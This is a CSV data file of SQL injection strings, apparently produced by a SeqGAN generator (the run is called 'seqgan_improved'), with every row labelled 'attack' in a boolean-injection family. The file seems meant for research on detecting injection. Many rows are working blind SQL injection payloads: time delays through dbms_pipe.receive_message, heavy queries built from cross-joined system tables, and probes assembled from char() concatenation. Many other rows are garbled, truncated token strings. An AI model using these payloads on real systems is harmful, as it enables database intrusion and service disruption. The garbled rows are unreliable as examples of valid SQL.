label,payload,family,payload_type,method,run_id,sample_index
attack,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,11
attack,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'ns where 1570  (  =  7522   (  500000000p_umas 7417in.t_s t(  4018  =  =  =  iner_setj 8691  =L c=  1087 _(  =  =  7522  (  3880 like 3862 char  =  (  6849  re6179  =  =  select 2*  s  =    (  =  =  7522  =    =  select   83  =  =  3880 2774 2774 where or (  =  when  (  1087 oryppo t2,(  (  select",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,12
attack,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'where  (  =  5485 3880 and orthen  (  =   (  113    =  =     as 6388yp_ 8691   =  =  ( 9643x=  =  =_s t1,p_s 3038trindt1,aingeas t6388exp_us ainfgeas as where 7555 7793 3393ef(  (  (  =  3393appibft_uroules where 8571 2961  (  =  *  =  =  (  =  8315  6849 7793  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,13
attack,1'||  (  select 'n,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,14
attack,"""  =  ""1   /*",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,15
attack,1'+  (  select 'a,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,16
attack,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,17
attack,1y,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,18
attack,"1"")       )   )         )     )  8571--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,19
attack,1'+  (  select 'dz,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,20
attack,"1"")    =    crainztaim.tab$fib1ereaintr  oupeay  =(  (  9643  =  (  (  atchar  =     7555=  (    7185  fing 6388  =    (  (  =y=  6849t_le,ex= 8691  =  1087  =  =  =  (  =_ apiexp_s refg'  )  =  =  =  (    (  8571  =  =  =  =  7793  =  select 5286  5485char  =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,21
attack,"1 whereor 6179  =  6671 2642 6849dont  ((  =  L  =  3393   (  *  =  (  =  65  =  =  (  =e  (  85  4799  =  (  =  select     (  r or gep  =  (  =  =  =  r""  rs where 4018  (  =  3862  (    (  =  =  (  6671 or _mass t1,atea.y  =  (  *  (  =    1087 9643  (  =       =  68  =  (  3880",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,22
attack,"1   ) where 3862 char  (  1087  = 6671  (  rdol_up_s orusbss rdbain.s t2bmas domalun.ssys abdb(  rdbleain.finex 2180  (  =  )  gyp_llefgepe7522  r_upsyll_usttreprgexep_,(  3393 or 4018  7522  =    =  =  =p_ and 8446744073709551610   from t",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,23
attack,"1 abr ab$f cimaomaopdmnws as in'  )   and    (    (   't4asgta3352 3880 6388  =    (  =  (  =  gep_lsusybmaing,epp_",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,24
attack,-9148  3484,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,25
attack,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%""  =  """"  =  ""x8403' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'M*    )    (  1087  (  6503 and and    5  =  1087 3  (  char  =  =  1087 or 2832  r  =  = 6849  = char  = 2724 e  =    =  (  6671  (  =  (  (  9575  =  (  1087zt  =  ril_tchar  3862 4799 3862  (   65  =  =    (  =  'unusual'  =  =  (  3352   (  4018 char  =  case  (  (  (  =  c where and 9643    =e  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,26
attack,1'  )   and 8148  =  like  (  'as,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,27
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,28
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,29
attack,"1hdsz' where 4912  =  4912 or 6979  =  like  (  'abghdpqcrz""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,30
attack,1' in boolean mode  )   or 6979  =  like  (  'fk,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,31
attack,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%z4",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,32
attack,"1%""  =  ""K",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,33
attack,"1'  )     )    or when 8446744073709551610   )    (  65  =  (  selectiblouns as t2,rl_uprl_umas adbfsus dbledelbl_ublbgselect deeppt_s and 7555 ap_usestalepepept_upibm,dblll_upgdbmstrrzt  (  =  upexe_s iblion.trdomang  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,34
attack,"1  )    as as able  =    (  select  ,5000000000  =/c6671 2649 6671 or char  (  selectN_,v  =  a/p_ket  (  =_ 2027  =  (  =  2961   (  3862 8691  dp  l_r6388 a6503rill_ s as taint_s t2tasib$)  rypes elmri_ustrtaeregexp_kapp_subrdb$b$ft4ab",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,35
attack,"1'  )    k500000000  =  =  (    =  ryp_ubll_us   alomn.tusert_iomas t1,rjins uin.taingun  (  0x7171706a71  (  1441  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,36
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,37
attack,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,38
attack,"1'||  (  select 'lurz' like 'y' or 'zo1%"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,39
attack,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kk' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,40
attack,"select   k   =    coupt_upreg ',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '_u ainss as t2,as bl_u ,rdb$ibllihq_t  (  1048db$t  =_kupyp  =e'cgou' or char  (  =  rinerrert_ubmdbl_s t1domaolluns t3  113  k  rypdessuls t2,db$fis ans ubl_ustrere",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,41
attack,"1'+  (  select '' 6503     )   where 1087   f t(  =  4018  =  3862  =  1087  =  =  =  3393(  4018  (  (  =  107    (  =    (  7522  (  =  (  select t    =  q  =  =  0x7171706a71,dbffit1ie",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,42
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,43
attack,1'   )    lainsyse9575dol_ushrtchar  ( or char  (  re(  =  =  =  ||6179  if or 8691  =  2180 f t 7555p  (  cht  (  5389  = or or or char  (  69 _upt 6179  (  =  char  =h_uppp_,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,44
attack,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'irm",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,45
attack,"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  'mf""  =  ""xh  (  =  101    =  =  (  (  =  (  1087  =  =  =    =  (  =    =  113  (  =  select when 1668  ft  (  85  ,r2642  (ecmas regerpedomalliinsys t1,atatt  (  select 2649  x  (  =  6388 3393  (    =  =  (  =    (  co",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,46
attack,"1"" where 'unusual'L  (  *  (  68  =  =  _ ,qxpep_,refiomimpeg(ep  =  =  5485_ubp_s abl_s ting(  (  rh_esuptt  (   whenupa(  =  = 1640ap_ibll_umaes t  iblellel_umbliom.tabdonssim.",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,47
attack,"1""  =  ""m",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,48
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,49
attack,1   )    /*,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,50
attack,"1'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,51
attack,"1""  =  ""7185/O  select co t5  )   3880    =  1087 6179  cb$call_ummmftpstret_usimas tin.tainteail_ub$f _ustabl_ucomalmacrdblummg'  )   and    (    (   'tp",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,52
attack,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ubm.dbll  1541eptdcdol_k  rdbles asblel_usyptibll2961eftab=  = _upj cy  bp_tere_' like 's ibl_kappedcdbs as ainyft3  )  r=  rypining,at inxp_dseft1t  =    =  7555  = 4018  =  rigedomakxlrinsta",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,53
attack,"1',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,54
attack,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'vs whereyp_pegdgexpp  =  (  = or domalry t_us as typ_instai$asiomu' or ')s t2961t  (  119  (  r rhtaincoll_s t2t  (  =  =  7555 =  =     (  83  =  2180  =  2961  (  (  at  =  =    (  re_s lyp_s t3  (    cgexp_s as oma",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,55
attack,1%%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,56
attack,"1%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,57
attack,"1"" where 9643  * 2649 3393  =  =    =  =    7555  1087  (  =  =  =  (  and 6671  (  case t4'cgou' 8446744073709551610  (    )    =  =  1441  =  =    r  (  (  3352  =  =  =  re  =  7522  =  =  char  =  (  (  (  =  *  (  char  =  = 2027  U 4018  =  =  =  =m',char  =  char  =  (     (  8459  (  *  (  113  =  3484c  =  =  69 char",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,58
attack,1%'||  (  select 'prt,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,59
attack,"1%'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'jx' where 4912  =  4912 or 6979  =  like  (  '1541thenrtastasegt_s   )     )   altype  (     )  3880  (  (  =ecouppge2649  =  65  =    = like,p_l_us t2,s t1,ltribligerex 1668  red,pttat  =  49b_us rinbsepeandoma,ustrs t1,ub$=efum.ppert  (  6388  2774  =  (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,60
attack,_u tchar  =  xp_inxp_s,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,61
attack,"1 where 3352  (    (  =  2774  ((  =  coumatas t1,dolas trecrt  (  =L4 9643  5485  =  =  3393 char  =  ritrsert   (  (  =p4799  (  =  101  (  *  (  =  rigNib$fil_kusyss where * concat  =  (  =  =  2961_ 6671  =  =  = or and like   (  5485 3352 or 2642 1087 *   =  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,62
attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'raqd' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,63
attack,"-9133""lomzys t) where _kub",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,64
attack,%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,65
attack,"-hv4   ' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,66
attack,1%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,67
attack,"1   wherei.cs t1,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,68
attack,"-""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""101105   )      ht  (  ringhpexp_us as as char ab$mingel_umas as tt2b",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,69
attack,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'z' like '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,70
attack,1' where char  =  =  3352  (  =  3880  2027 2774 at  =  =  =  =    (  =  =  (  _ coht  =  113  =  =  = char  char  (  (    =  =  =  =  =  122  (  =   ap_ks vert_upauns 7522 t  =     )  and  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,71
attack,"11,'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,72
attack,1 where t  (  rex char  fexplatsibryplleages where char  (  = or or or or when   (  =  2774 char  (  (  =  1441  =_us 7555 an    (  =  =  cousys t2m'  =  'trs as t4 dbldosus where 2180  (  =  (  (  ||char  (  =  =  (  =  lht_upepepeyp_t4ioub,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,73
attack,"-2583""  )   or comas tas ,efysast""  )   or   (  ""_k ailas dom.tabblis in.tretab_ss t2,alesys domains tapeceaill_us iomnin.s ains where or 1087  (  select 6179e_*L _rxp_upe_us  s t1,rdomaulaimaomdma.ts ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,74
attack,1magk,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,75
attack,"1"") where 4018 3880  =  =  (  "" *  (  rsy  =  3484exp_7417exp_llt  (  )  =  or or 7522  =  (  =  =  (  (  (e  =  1087  )  3393 char  ry  (  111 6093  (  rledouselupel_uptabl_useredolbl_ubll_ufs in.res asertrdb$fint_sys t2,1",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,76
attack,1'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,77
attack,"1"" whereyp_upcolles t or concat  (  =  (  =  3880  =xepp  (  t  =  500000000/p_per 6849  =  (  5485 5556  = or or where  = or oryps or (  6849  2180 char  =  4799 and 8446744073709551610select char   (  =  122  =       (  =  =  (  *  (    _upxpL_--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,78
attack,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,79
attack,"1""   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,80
attack,"1%' or 8384  =  like  (  'a  upv  ,ermadb$fiblegh_uomasustat abfunt_tas dom.dom.s ringexp_submribm""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,81
attack,"1%'  )   or   (  2301  =  7504  )  *7504 and   (  'a' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,82
attack,"1""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%' like 'anwtj",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,83
attack,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,84
attack,-9133%'   )    3352 6388 char  =    =  )  (  1087 3  =  r  =    (  =  (  and _(  =  =  2774  (  =  =  =  * or and 35804ilzblog adsstytchar  (  repingh  (  (    =  =p_upexp__u where a(    (  =   (  =  =_u,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,85
